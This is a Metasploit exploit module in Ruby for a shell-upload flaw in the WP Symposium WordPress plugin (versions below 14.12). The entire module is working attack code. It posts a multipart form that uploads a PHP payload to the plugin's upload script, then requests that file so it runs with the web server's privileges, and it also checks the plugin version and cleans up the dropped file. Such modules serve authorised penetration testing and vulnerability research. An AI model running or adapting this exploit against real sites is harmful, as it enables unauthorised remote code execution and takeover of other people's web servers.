# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => &#039;WordPress WP Symposium 14.11 Shell Upload&#039;,
      &#039;Description&#039;     => %q{WP Symposium Plugin for WordPress contains a
                              flaw that allows a remote attacker to execute
                              arbitrary PHP code. This flaw exists because the
                              /wp-symposium/server/file_upload_form.php script
                              does not properly verify or sanitize
                              user-uploaded files. By uploading a .php file,
                              the remote system will place the file in a
                              user-accessible path. Making a direct request to
                              the uploaded file will allow the attacker to
                              execute the script with the privileges of the
                              web server.},
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Claudio Viviani&#039;,                # Vulnerability disclosure
          &#039;Rob Carr <rob[at]rastating.com>&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [&#039;OSVDB&#039;, &#039;116046&#039;],
          [&#039;WPVDB&#039;, &#039;7716&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Dec 11 2014&#039;,
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;wp-symposium < 14.12&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0
    ))
  end
 
  def check
    check_plugin_version_from_readme(&#039;wp-symposium&#039;, &#039;14.12&#039;)
  end
 
  def generate_mime_message(payload, payload_name, directory_name, symposium_url)
    data = Rex::MIME::Message.new
    data.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="uploader_uid"&#039;)
    data.add_part("./#{directory_name}/", nil, nil, &#039;form-data; name="uploader_dir"&#039;)
    data.add_part(symposium_url, nil, nil, &#039;form-data; name="uploader_url"&#039;)
    data.add_part(payload.encoded, &#039;application/x-php&#039;, nil, "form-data; name=\"files[]\"; filename=\"#{payload_name}\"")
    data
  end
 
  def exploit
    print_status("#{peer} - Preparing payload")
    unique_name = Rex::Text.rand_text_alpha(10)
    payload_name = "#{unique_name}.php"
    payload_url = normalize_uri(symposium_url, unique_name, payload_name)
    data = generate_mime_message(payload, payload_name, unique_name, symposium_url)
    symposium_url = normalize_uri(symposium_url, &#039;index.php&#039;)
 
    print_status("#{peer} - Uploading payload to #{payload_url}")
    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => symposium_url,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;    => data.to_s
    )
 
    if res && res.code == 200 && res.body.length > 0 && !res.body.include?(&#039;error&#039;) && res.body != &#039;0&#039;
      print_good("#{peer} - Uploaded the payload")
      register_files_for_cleanup(payload_name)
 
      print_status("#{peer} - Executing the payload...")
      send_request_cgi(
      {
        &#039;uri&#039;     => payload_url,
        &#039;method&#039;  => &#039;GET&#039;
      }, 5)
      print_good("#{peer} - Executed payload")
    else
      if res.nil?
        fail_with(Failure::Unreachable, "No response from the target")
      else
        vprint_error("#{peer} - HTTP Status: #{res.code}")
        vprint_error("#{peer} - Server returned: #{res.body}")
        fail_with(Failure::UnexpectedReply, "Failed to upload the payload")
      end
    end
  end
end

